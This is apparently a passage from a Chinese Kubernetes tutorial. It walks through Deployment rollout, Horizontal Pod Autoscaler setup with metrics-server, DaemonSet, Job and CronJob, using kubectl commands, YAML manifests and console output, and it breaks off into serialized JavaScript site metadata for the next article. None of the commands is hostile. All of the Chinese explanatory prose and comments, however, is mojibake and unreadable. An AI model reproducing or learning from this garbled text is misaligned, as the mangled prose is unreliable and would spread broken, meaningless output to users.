-n dev\nname                             ready   status    restarts   age\npc-deployment-5d89bdfbf9-rj8sq   1/1     running   0          7m33s\npc-deployment-5d89bdfbf9-ttwgg   1/1     running   0          7m35s\npc-deployment-5d89bdfbf9-v4wvc   1/1     running   0          7m34s\npc-deployment-6c9f56fcfb-996rt   1/1     running   0          3m31s\npc-deployment-6c9f56fcfb-j2gtj   1/1     running   0          3m31s\n\n# ç¡®ä¿æ´æ°çpodæ²¡é®é¢äºï¼ç»§ç»­æ´æ°\n[root@k8s-master01 ~]# kubectl rollout resume deploy pc-deployment -n dev\ndeployment.apps/pc-deployment resumed\n\n# æ¥çæåçæ´æ°æåµ\n[root@k8s-master01 ~]# kubectl get rs -n dev -o wide\nname                       desired   current   ready   age     containers   images         \npc-deployment-5d89bdfbf9   0         0         0       21m     nginx        nginx:1.17.1   \npc-deployment-675d469f8b   0         0         0       16m     nginx        nginx:1.17.2   \npc-deployment-6c9f56fcfb   4         4         4       5m11s   nginx        nginx:1.17.4   \n\n[root@k8s-master01 ~]# kubectl get pods -n dev\nname                             ready   status    restarts   age\npc-deployment-6c9f56fcfb-7bfwh   1/1     running   0          37s\npc-deployment-6c9f56fcfb-996rt   1/1     running   0          5m27s\npc-deployment-6c9f56fcfb-j2gtj   1/1     running   0          5m27s\npc-deployment-6c9f56fcfb-rf84v   1/1     running   0          37s\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n\n\nå é¤ deployment\n\n# å é¤deploymentï¼å¶ä¸çrsåpodä¹å°è¢«å é¤\n[root@k8s-master01 ~]# kubectl delete -f pc-deployment.yaml\ndeployment.apps "pc-deployment" deleted\n\n\n1\n2\n3\n\n\n\n# horizontal pod autoscaler(hpa)\n\nå¨åé¢çè¯¾ç¨ä¸­ï¼æä»¬å·²ç»å¯ä»¥å®ç°éè¿æå·¥æ§è¡ kubectl scale å½ä»¤å®ç° pod æ©å®¹æç¼©å®¹ï¼ä½æ¯è¿æ¾ç¶ä¸ç¬¦å kubernetes çå®ä½ç®æ  -- èªå¨åãæºè½åã kubernetes ææå¯ä»¥å®ç°éè¿çæµ pod çä½¿ç¨æåµï¼å®ç° pod æ°éçèªå¨è°æ´ï¼äºæ¯å°±äº§çäº horizontal pod autoscalerï¼hpaï¼è¿ç§æ§å¶å¨ã\n\nhpa å¯ä»¥è·åæ¯ä¸ª pod å©ç¨çï¼ç¶åå hpa ä¸­å®ä¹çææ è¿è¡å¯¹æ¯ï¼åæ¶è®¡ç®åºéè¦ä¼¸ç¼©çå·ä½å¼ï¼æåå®ç° pod çæ°éçè°æ´ãå¶å® hpa ä¸ä¹åç deployment ä¸æ ·ï¼ä¹å±äºä¸ç§ kubernetes èµæºå¯¹è±¡ï¼å®éè¿è¿½è¸ªåæ rc æ§å¶çææç®æ  pod çè´è½½ååæåµï¼æ¥ç¡®å®æ¯å¦éè¦éå¯¹æ§å°è°æ´ç®æ  pod çå¯æ¬æ°ï¼è¿æ¯ hpa çå®ç°åçã\n\n\n\n1 å®è£ metrics-server\nmetrics-server å¯ä»¥ç¨æ¥æ¶ééç¾¤ä¸­çèµæºä½¿ç¨æåµ\n\n# å®è£git\n[root@k8s-master01 ~]# yum install git -y\n# è·åmetrics-server, æ³¨æä½¿ç¨ççæ¬\n[root@k8s-master01 ~]# git clone -b v0.3.6 https://github.com/kubernetes-incubator/metrics-server\n# ä¿®æ¹deployment, æ³¨æä¿®æ¹çæ¯éåååå§ååæ°\n[root@k8s-master01 ~]# cd /root/metrics-server/deploy/1.8+/\n[root@k8s-master01 1.8+]# vim metrics-server-deployment.yaml\næå¾ä¸­æ·»å ä¸é¢éé¡¹\nhostnetwork: true\nimage: registry.cn-hangzhou.aliyuncs.com/google_containers/metrics-server-amd64:v0.3.6\nargs:\n- --kubelet-insecure-tls\n- --kubelet-preferred-address-types=internalip,hostname,internaldns,externaldns,externalip\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\n\n\n# å®è£metrics-server\n[root@k8s-master01 1.8+]# kubectl apply -f ./\n\n# æ¥çpodè¿è¡æåµ\n[root@k8s-master01 1.8+]# kubectl get pod -n kube-system\nmetrics-server-6b976979db-2xwbj   1/1     running   0          90s\n\n# ä½¿ç¨kubectl top node æ¥çèµæºä½¿ç¨æåµ\n[root@k8s-master01 1.8+]# kubectl top node\nname           cpu(cores)   cpu%   memory(bytes)   memory%\nk8s-master01   289m         14%    1582mi          54%       \nk8s-node01     81m          4%     1195mi          40%       \nk8s-node02     72m          3%     1211mi          41%  \n[root@k8s-master01 1.8+]# kubectl top pod -n kube-system\nname                              cpu(cores)   memory(bytes)\ncoredns-6955765f44-7ptsb          3m           9mi\ncoredns-6955765f44-vcwr5          3m           8mi\netcd-master                       14m          145mi\n...\n# è³æ­¤,metrics-serverå®è£å®æ\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n\n\n2 åå¤ deployment å servie\n\napiversion: apps/v1\nkind: deployment\nmetadata:\n  name: nginx\n  namespace: dev\nspec:\n  strategy: # ç­ç¥\n    type: rollingupdate # æ»å¨æ´æ°ç­ç¥\n  replicas: 1\n  selector:\n    matchlabels:\n      app: nginx-pod\n  template:\n    metadata:\n      labels:\n        app: nginx-pod\n    spec:\n      containers:\n      - name: nginx\n        image: nginx:1.17.1\n        resources: # èµæºéé¢\n          limits:  # éå¶èµæºï¼ä¸éï¼\n            cpu: "1" # cpuéå¶ï¼åä½æ¯coreæ°\n          requests: # è¯·æ±èµæºï¼ä¸éï¼\n            cpu: "100m"  # cpuéå¶ï¼åä½æ¯coreæ°\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n\n\n# åå»ºservice\n[root@k8s-master01 1.8+]# kubectl expose deployment nginx --type=nodeport --port=80 -n dev\n\n\n1\n2\n\n\n# æ¥ç\n[root@k8s-master01 1.8+]# kubectl get deployment,pod,svc -n dev\nname                    ready   up-to-date   available   age\ndeployment.apps/nginx   1/1     1            1           47s\n\nname                         ready   status    restarts   age\npod/nginx-7df9756ccc-bh8dr   1/1     running   0          47s\n\nname            type       cluster-ip      external-ip   port(s)        age\nservice/nginx   nodeport   10.101.18.29   <none>        80:31830/tcp   35s\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n3 é¨ç½² hpa\nåå»º pc-hpa.yaml æä»¶ï¼åå®¹å¦ä¸ï¼\n\napiversion: autoscaling/v1\nkind: horizontalpodautoscaler\nmetadata:\n  name: pc-hpa\n  namespace: dev\nspec:\n  minreplicas: 1  #æå°podæ°é\n  maxreplicas: 10 #æå¤§podæ°é\n  targetcpuutilizationpercentage: 3 # cpuä½¿ç¨çææ ï¼3%ï¼\n  scaletargetref:   # æå®è¦æ§å¶çnginxä¿¡æ¯\n    apiversion: apps/v1\n    kind: deployment\n    name: nginx\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\n# åå»ºhpa\n[root@k8s-master01 1.8+]# kubectl create -f pc-hpa.yaml\nhorizontalpodautoscaler.autoscaling/pc-hpa created\n\n# æ¥çhpa\n    [root@k8s-master01 1.8+]# kubectl get hpa -n dev\nname     reference          targets   minpods   maxpods   replicas   age\npc-hpa   deployment/nginx   0%/3%     1         10        1          62s\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n4 æµè¯\nä½¿ç¨åæµå·¥å·å¯¹ service å°å 192.168.5.4:31830 è¿è¡åæµï¼ç¶åéè¿æ§å¶å°æ¥ç hpa å pod çåå\nhpa åå\n\n[root@k8s-master01 ~]# kubectl get hpa -n dev -w\nname   reference      targets  minpods  maxpods  replicas  age\npc-hpa  deployment/nginx  0%/3%   1     10     1      4m11s\npc-hpa  deployment/nginx  0%/3%   1     10     1      5m19s\npc-hpa  deployment/nginx  22%/3%   1     10     1      6m50s\npc-hpa  deployment/nginx  22%/3%   1     10     4      7m5s\npc-hpa  deployment/nginx  22%/3%   1     10     8      7m21s\npc-hpa  deployment/nginx  6%/3%   1     10     8      7m51s\npc-hpa  deployment/nginx  0%/3%   1     10     8      9m6s\npc-hpa  deployment/nginx  0%/3%   1     10     8      13m\npc-hpa  deployment/nginx  0%/3%   1     10     1      14m\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\ndeployment åå\n\n[root@k8s-master01 ~]# kubectl get deployment -n dev -w\nname    ready   up-to-date   available   age\nnginx   1/1     1            1           11m\nnginx   1/4     1            1           13m\nnginx   1/4     1            1           13m\nnginx   1/4     1            1           13m\nnginx   1/4     4            1           13m\nnginx   1/8     4            1           14m\nnginx   1/8     4            1           14m\nnginx   1/8     4            1           14m\nnginx   1/8     8            1           14m\nnginx   2/8     8            2           14m\nnginx   3/8     8            3           14m\nnginx   4/8     8            4           14m\nnginx   5/8     8            5           14m\nnginx   6/8     8            6           14m\nnginx   7/8     8            7           14m\nnginx   8/8     8            8           15m\nnginx   8/1     8            8           20m\nnginx   8/1     8            8           20m\nnginx   1/1     1            1           20m\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n\n\npod åå\n\n[root@k8s-master01 ~]# kubectl get pods -n dev -w\nname                     ready   status    restarts   age\nnginx-7df9756ccc-bh8dr   1/1     running   0          11m\nnginx-7df9756ccc-cpgrv   0/1     pending   0          0s\nnginx-7df9756ccc-8zhwk   0/1     pending   0          0s\nnginx-7df9756ccc-rr9bn   0/1     pending   0          0s\nnginx-7df9756ccc-cpgrv   0/1     containercreating   0          0s\nnginx-7df9756ccc-8zhwk   0/1     containercreating   0          0s\nnginx-7df9756ccc-rr9bn   0/1     containercreating   0          0s\nnginx-7df9756ccc-m9gsj   0/1     pending             0          0s\nnginx-7df9756ccc-g56qb   0/1     pending             0          0s\nnginx-7df9756ccc-sl9c6   0/1     pending             0          0s\nnginx-7df9756ccc-fgst7   0/1     pending             0          0s\nnginx-7df9756ccc-g56qb   0/1     containercreating   0          0s\nnginx-7df9756ccc-m9gsj   0/1     containercreating   0          0s\nnginx-7df9756ccc-sl9c6   0/1     containercreating   0          0s\nnginx-7df9756ccc-fgst7   0/1     containercreating   0          0s\nnginx-7df9756ccc-8zhwk   1/1     running             0          19s\nnginx-7df9756ccc-rr9bn   1/1     running             0          30s\nnginx-7df9756ccc-m9gsj   1/1     running             0          21s\nnginx-7df9756ccc-cpgrv   1/1     running             0          47s\nnginx-7df9756ccc-sl9c6   1/1     running             0          33s\nnginx-7df9756ccc-g56qb   1/1     running             0          48s\nnginx-7df9756ccc-fgst7   1/1     running             0          66s\nnginx-7df9756ccc-fgst7   1/1     terminating         0          6m50s\nnginx-7df9756ccc-8zhwk   1/1     terminating         0          7m5s\nnginx-7df9756ccc-cpgrv   1/1     terminating         0          7m5s\nnginx-7df9756ccc-g56qb   1/1     terminating         0          6m50s\nnginx-7df9756ccc-rr9bn   1/1     terminating         0          7m5s\nnginx-7df9756ccc-m9gsj   1/1     terminating         0          6m50s\nnginx-7df9756ccc-sl9c6   1/1     terminating         0          6m50s\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n\n\n\n# daemonset(ds)\n\ndaemonset ç±»åçæ§å¶å¨å¯ä»¥ä¿è¯å¨éç¾¤ä¸­çæ¯ä¸å°ï¼ææå®ï¼èç¹ä¸é½è¿è¡ä¸ä¸ªå¯æ¬ãä¸è¬éç¨äºæ¥å¿æ¶éãèç¹çæ§ç­åºæ¯ãä¹å°±æ¯è¯´ï¼å¦æä¸ä¸ª pod æä¾çåè½æ¯èç¹çº§å«çï¼æ¯ä¸ªèç¹é½éè¦ä¸åªéè¦ä¸ä¸ªï¼ï¼é£ä¹è¿ç±» pod å°±éåä½¿ç¨ daemonset ç±»åçæ§å¶å¨åå»ºã\n\n\n\ndaemonset æ§å¶å¨çç¹ç¹ï¼\n\n * æ¯å½åéç¾¤ä¸­æ·»å ä¸ä¸ªèç¹æ¶ï¼æå®ç pod å¯æ¬ä¹å°æ·»å å°è¯¥èç¹ä¸\n * å½èç¹ä»éç¾¤ä¸­ç§»é¤æ¶ï¼pod ä¹å°±è¢«åå¾åæ¶äº\n\nä¸é¢åæ¥çä¸ daemonset çèµæºæ¸åæä»¶\n\napiversion: apps/v1 # çæ¬å·\nkind: daemonset # ç±»å       \nmetadata: # åæ°æ®\n  name: # rsåç§° \n  namespace: # æå±å½åç©ºé´ \n  labels: #æ ç­¾\n    controller: daemonset\nspec: # è¯¦ææè¿°\n  revisionhistorylimit: 3 # ä¿çåå²çæ¬\n  updatestrategy: # æ´æ°ç­ç¥\n    type: rollingupdate # æ»å¨æ´æ°ç­ç¥\n    rollingupdate: # æ»å¨æ´æ°\n      maxunavailable: 1 # æå¤§ä¸å¯ç¨ç¶æç pod çæå¤§å¼ï¼å¯ä»¥ä¸ºç¾åæ¯ï¼ä¹å¯ä»¥ä¸ºæ´æ°\n  selector: # éæ©å¨ï¼éè¿å®æå®è¯¥æ§å¶å¨ç®¡çåªäºpod\n    matchlabels:      # labelså¹éè§å\n      app: nginx-pod\n    matchexpressions: # expressionså¹éè§å\n      - {key: app, operator: in, values: [nginx-pod]}\n  template: # æ¨¡æ¿ï¼å½å¯æ¬æ°éä¸è¶³æ¶ï¼ä¼æ ¹æ®ä¸é¢çæ¨¡æ¿åå»ºpodå¯æ¬\n    metadata:\n      labels:\n        app: nginx-pod\n    spec:\n      containers:\n      - name: nginx\n        image: nginx:1.17.1\n        ports:\n        - containerport: 80\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n\n\nåå»º pc-daemonset.yamlï¼åå®¹å¦ä¸ï¼\n\napiversion: apps/v1\nkind: daemonset      \nmetadata:\n  name: pc-daemonset\n  namespace: dev\nspec: \n  selector:\n    matchlabels:\n      app: nginx-pod\n  template:\n    metadata:\n      labels:\n        app: nginx-pod\n    spec:\n      containers:\n      - name: nginx\n        image: nginx:1.17.1\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n\n\n# åå»ºdaemonset\n[root@k8s-master01 ~]# kubectl create -f  pc-daemonset.yaml\ndaemonset.apps/pc-daemonset created\n\n# æ¥çdaemonset\n[root@k8s-master01 ~]#  kubectl get ds -n dev -o wide\nname        desired  current  ready  up-to-date  available   age   containers   images         \npc-daemonset   2        2        2      2           2        24s   nginx        nginx:1.17.1   \n\n# æ¥çpod,åç°å¨æ¯ä¸ªnodeä¸é½è¿è¡ä¸ä¸ªpod\n[root@k8s-master01 ~]#  kubectl get pods -n dev -o wide\nname                 ready   status    restarts   age   ip            node    \npc-daemonset-9bck8   1/1     running   0          37s   10.244.1.43   node1     \npc-daemonset-k224w   1/1     running   0          37s   10.244.2.74   node2      \n\n# å é¤daemonset\n[root@k8s-master01 ~]# kubectl delete -f pc-daemonset.yaml\ndaemonset.apps "pc-daemonset" deleted\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\n\n# job\n\njobï¼ä¸»è¦ç¨äºè´è´£ ** æ¹éå¤ç (ä¸æ¬¡è¦å¤çæå®æ°éä»»å¡) ç­æçä¸æ¬¡æ§ (æ¯ä¸ªä»»å¡ä»è¿è¡ä¸æ¬¡å°±ç»æ)** ä»»å¡ãjob ç¹ç¹å¦ä¸ï¼\n\n * å½ job åå»ºç pod æ§è¡æåç»ææ¶ï¼job å°è®°å½æåç»æç pod æ°é\n * å½æåç»æç pod è¾¾å°æå®çæ°éæ¶ï¼job å°å®ææ§è¡\n\n\n\njob çèµæºæ¸åæä»¶ï¼\n\napiversion: batch/v1 # çæ¬å·\nkind: job # ç±»å       \nmetadata: # åæ°æ®\n  name: # rsåç§° \n  namespace: # æå±å½åç©ºé´ \n  labels: #æ ç­¾\n    controller: job\nspec: # è¯¦ææè¿°\n  completions: 1 # æå®jobéè¦æåè¿è¡podsçæ¬¡æ°ãé»è®¤å¼: 1\n  parallelism: 1 # æå®jobå¨ä»»ä¸æ¶å»åºè¯¥å¹¶åè¿è¡podsçæ°éãé»è®¤å¼: 1\n  activedeadlineseconds: 30 # æå®jobå¯è¿è¡çæ¶é´æéï¼è¶è¿æ¶é´è¿æªç»æï¼ç³»ç»å°ä¼å°è¯è¿è¡ç»æ­¢ã\n  backofflimit: 6 # æå®jobå¤±è´¥åè¿è¡éè¯çæ¬¡æ°ãé»è®¤æ¯6\n  manualselector: true # æ¯å¦å¯ä»¥ä½¿ç¨selectoréæ©å¨éæ©podï¼é»è®¤æ¯false\n  selector: # éæ©å¨ï¼éè¿å®æå®è¯¥æ§å¶å¨ç®¡çåªäºpod\n    matchlabels:      # labelså¹éè§å\n      app: counter-pod\n    matchexpressions: # expressionså¹éè§å\n      - {key: app, operator: in, values: [counter-pod]}\n  template: # æ¨¡æ¿ï¼å½å¯æ¬æ°éä¸è¶³æ¶ï¼ä¼æ ¹æ®ä¸é¢çæ¨¡æ¿åå»ºpodå¯æ¬\n    metadata:\n      labels:\n        app: counter-pod\n    spec:\n      restartpolicy: never # éå¯ç­ç¥åªè½è®¾ç½®ä¸ºneveræèonfailure\n      containers:\n      - name: counter\n        image: busybox:1.30\n        command: ["bin/sh","-c","for i in 9 8 7 6 5 4 3 2 1; do echo $i;sleep 2;done"]\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n\n\n> å³äºéå¯ç­ç¥è®¾ç½®çè¯´æï¼\n> å¦ææå®ä¸º onfailureï¼å job ä¼å¨ pod åºç°æéæ¶éå¯å®¹å¨ï¼èä¸æ¯åå»º podï¼failed æ¬¡æ°ä¸å\n> å¦ææå®ä¸º neverï¼å job ä¼å¨ pod åºç°æéæ¶åå»ºæ°ç podï¼å¹¶ä¸æé pod ä¸ä¼æ¶å¤±ï¼ä¹ä¸ä¼éå¯ï¼failed æ¬¡æ°å  1\n> å¦ææå®ä¸º always çè¯ï¼å°±æå³çä¸ç´éå¯ï¼æå³ç job ä»»å¡ä¼éå¤å»æ§è¡äºï¼å½ç¶ä¸å¯¹ï¼æä»¥ä¸è½è®¾ç½®ä¸º always\n\nåå»º pc-job.yamlï¼åå®¹å¦ä¸ï¼\n\napiversion: batch/v1\nkind: job      \nmetadata:\n  name: pc-job\n  namespace: dev\nspec:\n  manualselector: true\n  selector:\n    matchlabels:\n      app: counter-pod\n  template:\n    metadata:\n      labels:\n        app: counter-pod\n    spec:\n      restartpolicy: never\n      containers:\n      - name: counter\n        image: busybox:1.30\n        command: ["bin/sh","-c","for i in 9 8 7 6 5 4 3 2 1; do echo $i;sleep 3;done"]\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n\n\n# åå»ºjob\n[root@k8s-master01 ~]# kubectl create -f pc-job.yaml\njob.batch/pc-job created\n\n# æ¥çjob\n[root@k8s-master01 ~]# kubectl get job -n dev -o wide  -w\nname     completions   duration   age   containers   images         selector\npc-job   0/1           21s        21s   counter      busybox:1.30   app=counter-pod\npc-job   1/1           31s        79s   counter      busybox:1.30   app=counter-pod\n\n# éè¿è§å¯podç¶æå¯ä»¥çå°ï¼podå¨è¿è¡å®æ¯ä»»å¡åï¼å°±ä¼åæcompletedç¶æ\n[root@k8s-master01 ~]# kubectl get pods -n dev -w\nname           ready   status     restarts      age\npc-job-rxg96   1/1     running     0            29s\npc-job-rxg96   0/1     completed   0            33s\n\n# æ¥ä¸æ¥ï¼è°æ´ä¸podè¿è¡çæ»æ°éåå¹¶è¡æ°é å³ï¼å¨specä¸è®¾ç½®ä¸é¢ä¸¤ä¸ªéé¡¹\n#  completions: 6 # æå®jobéè¦æåè¿è¡podsçæ¬¡æ°ä¸º6\n#  parallelism: 3 # æå®jobå¹¶åè¿è¡podsçæ°éä¸º3\n#  ç¶åéæ°è¿è¡jobï¼è§å¯ææï¼æ­¤æ¶ä¼åç°ï¼jobä¼æ¯æ¬¡è¿è¡3ä¸ªpodï¼æ»å±æ§è¡äº6ä¸ªpod\n[root@k8s-master01 ~]# kubectl get pods -n dev -w\nname           ready   status    restarts   age\npc-job-684ft   1/1     running   0          5s\npc-job-jhj49   1/1     running   0          5s\npc-job-pfcvh   1/1     running   0          5s\npc-job-684ft   0/1     completed   0          11s\npc-job-v7rhr   0/1     pending     0          0s\npc-job-v7rhr   0/1     pending     0          0s\npc-job-v7rhr   0/1     containercreating   0          0s\npc-job-jhj49   0/1     completed           0          11s\npc-job-fhwf7   0/1     pending             0          0s\npc-job-fhwf7   0/1     pending             0          0s\npc-job-pfcvh   0/1     completed           0          11s\npc-job-5vg2j   0/1     pending             0          0s\npc-job-fhwf7   0/1     containercreating   0          0s\npc-job-5vg2j   0/1     pending             0          0s\npc-job-5vg2j   0/1     containercreating   0          0s\npc-job-fhwf7   1/1     running             0          2s\npc-job-v7rhr   1/1     running             0          2s\npc-job-5vg2j   1/1     running             0          3s\npc-job-fhwf7   0/1     completed           0          12s\npc-job-v7rhr   0/1     completed           0          12s\npc-job-5vg2j   0/1     completed           0          12s\n\n# å é¤job\n[root@k8s-master01 ~]# kubectl delete -f pc-job.yaml\njob.batch "pc-job" deleted\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n\n\n\n# cronjob(cj)\n\ncronjob æ§å¶å¨ä»¥ job æ§å¶å¨èµæºä¸ºå¶ç®¡æ§å¯¹è±¡ï¼å¹¶åå©å®ç®¡ç pod èµæºå¯¹è±¡ï¼job æ§å¶å¨å®ä¹çä½ä¸ä»»å¡å¨å¶æ§å¶å¨èµæºåå»ºä¹åä¾¿ä¼ç«å³æ§è¡ï¼ä½ cronjob å¯ä»¥ä»¥ç±»ä¼¼äº linux æä½ç³»ç»çå¨ææ§ä»»å¡ä½ä¸è®¡åçæ¹å¼æ§å¶å¶è¿è¡æ¶é´ç¹åéå¤è¿è¡çæ¹å¼ãä¹å°±æ¯è¯´ï¼cronjob å¯ä»¥å¨ç¹å®çæ¶é´ç¹ (åå¤ç) å»è¿è¡ job ä»»å¡ã\n\n\n\ncronjob çèµæºæ¸åæä»¶ï¼\n\napiversion: batch/v1beta1 # çæ¬å·\nkind: cronjob # ç±»å       \nmetadata: # åæ°æ®\n  name: # rsåç§° \n  namespace: # æå±å½åç©ºé´ \n  labels: #æ ç­¾\n    controller: cronjob\nspec: # è¯¦ææè¿°\n  schedule: # cronæ ¼å¼çä½ä¸è°åº¦è¿è¡æ¶é´ç¹,ç¨äºæ§å¶ä»»å¡å¨ä»ä¹æ¶é´æ§è¡\n  concurrencypolicy: # å¹¶åæ§è¡ç­ç¥ï¼ç¨äºå®ä¹åä¸æ¬¡ä½ä¸è¿è¡å°æªå®ææ¶æ¯å¦ä»¥åå¦ä½è¿è¡åä¸æ¬¡çä½ä¸\n  failedjobhistorylimit: # ä¸ºå¤±è´¥çä»»å¡æ§è¡ä¿ççåå²è®°å½æ°ï¼é»è®¤ä¸º1\n  successfuljobhistorylimit: # ä¸ºæåçä»»å¡æ§è¡ä¿ççåå²è®°å½æ°ï¼é»è®¤ä¸º3\n  startingdeadlineseconds: # å¯å¨ä½ä¸éè¯¯çè¶æ¶æ¶é¿\n  jobtemplate: # jobæ§å¶å¨æ¨¡æ¿ï¼ç¨äºä¸ºcronjobæ§å¶å¨çæjobå¯¹è±¡;ä¸é¢å¶å®å°±æ¯jobçå®ä¹\n    metadata:\n    spec:\n      completions: 1\n      parallelism: 1\n      activedeadlineseconds: 30\n      backofflimit: 6\n      manualselector: true\n      selector:\n        matchlabels:\n          app: counter-pod\n        matchexpressions: è§å\n          - {key: app, operator: in, values: [counter-pod]}\n      template:\n        metadata:\n          labels:\n            app: counter-pod\n        spec:\n          restartpolicy: never \n          containers:\n          - name: counter\n            image: busybox:1.30\n            command: ["bin/sh","-c","for i in 9 8 7 6 5 4 3 2 1; do echo $i;sleep 20;done"]\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n\n\néè¦éç¹è§£éçå ä¸ªéé¡¹ï¼\nschedule: cronè¡¨è¾¾å¼ï¼ç¨äºæå®ä»»å¡çæ§è¡æ¶é´\n    */1    *      *    *     *\n    <åé> <å°æ¶> <æ¥> <æä»½> <ææ>\n\n    åé å¼ä» 0 å° 59.\n    å°æ¶ å¼ä» 0 å° 23.\n    æ¥ å¼ä» 1 å° 31.\n    æ å¼ä» 1 å° 12.\n    ææ å¼ä» 0 å° 6, 0 ä»£è¡¨æææ¥\n    å¤ä¸ªæ¶é´å¯ä»¥ç¨éå·éå¼ï¼ èå´å¯ä»¥ç¨è¿å­ç¬¦ç»åºï¼*å¯ä»¥ä½ä¸ºééç¬¦ï¼ /è¡¨ç¤ºæ¯...\nconcurrencypolicy: æ¯å¦aä»»å¡1åéè¿è¡ä¸æ¬¡ï¼å¯æ¯aä»»å¡æ¬æ¬¡è¿è¡äºè¶è¿1åéï¼é£ä¹æ¯å¦åè®¸è®©ä¸ä¸ªå¨æçä»»å¡è¿è¡ï¼\n    allow:   åè®¸jobså¹¶åè¿è¡(é»è®¤)\n    forbid:  ç¦æ­¢å¹¶åè¿è¡ï¼å¦æä¸ä¸æ¬¡è¿è¡å°æªå®æï¼åè·³è¿ä¸ä¸æ¬¡è¿è¡\n    replace: æ¿æ¢ï¼åæ¶å½åæ­£å¨è¿è¡çä½ä¸å¹¶ç¨æ°ä½ä¸æ¿æ¢å®\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n\nåå»º pc-cronjob.yamlï¼åå®¹å¦ä¸ï¼\n\napiversion: batch/v1beta1\nkind: cronjob\nmetadata:\n  name: pc-cronjob\n  namespace: dev\n  labels:\n    controller: cronjob\nspec:\n  schedule: "*/1 * * * *"\n  jobtemplate:\n    metadata:\n    spec:\n      template:\n        spec:\n          restartpolicy: never\n          containers:\n          - name: counter\n            image: busybox:1.30\n            command: ["bin/sh","-c","for i in 9 8 7 6 5 4 3 2 1; do echo $i;sleep 3;done"]\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n\n\n# åå»ºcronjob\n[root@k8s-master01 ~]# kubectl create -f pc-cronjob.yaml\ncronjob.batch/pc-cronjob created\n\n# æ¥çcronjob\n[root@k8s-master01 ~]# kubectl get cronjobs -n dev\nname         schedule      suspend   active   last schedule   age\npc-cronjob   */1 * * * *   false     0        <none>          6s\n\n# æ¥çjob\n[root@k8s-master01 ~]# kubectl get jobs -n dev\nname                    completions   duration   age\npc-cronjob-1592587800   1/1           28s        3m26s\npc-cronjob-1592587860   1/1           28s        2m26s\npc-cronjob-1592587920   1/1           28s        86s\n\n# æ¥çpod\n[root@k8s-master01 ~]# kubectl get pods -n dev\npc-cronjob-1592587800-x4tsm   0/1     completed   0          2m24s\npc-cronjob-1592587860-r5gv4   0/1     completed   0          84s\npc-cronjob-1592587920-9dxxq   1/1     running     0          24s\n\n\n# å é¤cronjob\n[root@k8s-master01 ~]# kubectl  delete -f pc-cronjob.yaml\ncronjob.batch "pc-cronjob" deleted\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n',charsets:{cjk:!0}},{title:"kubernetes(ä¸) Pod è°åº¦",frontmatter:{title:"kubernetes(ä¸) Pod è°åº¦",date:"2023-06-25T09:22:36.000Z",permalink:"/kubernetes/606",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/01.%E8%BF%90%E7%BB%B4/60.Kubernetes/606.kubernetes(%E4%B8%83)%20Pod%20%E8%B0%83%E5%BA%A6.html",relativePath:"01.è¿ç»´/60.Kubernetes/606.kubernetes(ä¸) Pod è°åº¦.md",key:"v-79aee7c8",path:"/kubernetes/606/",headers:[{level:2,title:"å®åè°åº¦",slug:"å®åè°åº¦",normalizedTitle:"å®åè°åº¦",charIndex:225},{level:2,title:"äº²åæ§è°åº¦",slug:"äº²åæ§è°åº¦",normalizedTitle:"äº²åæ§è°åº¦",charIndex:255},{level:2,title:"æ±¡ç¹åå®¹å¿",slug:"æ±¡ç¹åå®¹å¿",normalizedTitle:"æ±¡ç¹åå®¹å¿",charIndex:14097}],lastUpdated:"12/22/2023, 3:44:32 PM",lastUpdatedTimestamp:1703231072e3,headersStr:"å®åè°åº¦ äº²åæ§è°åº¦ æ±¡ç¹åå®¹å¿",content:'å¨é»è®¤æåµä¸ï¼ä¸ä¸ª Pod å¨åªä¸ª Node èç¹ä¸è¿è¡ï¼æ¯ç± Scheduler 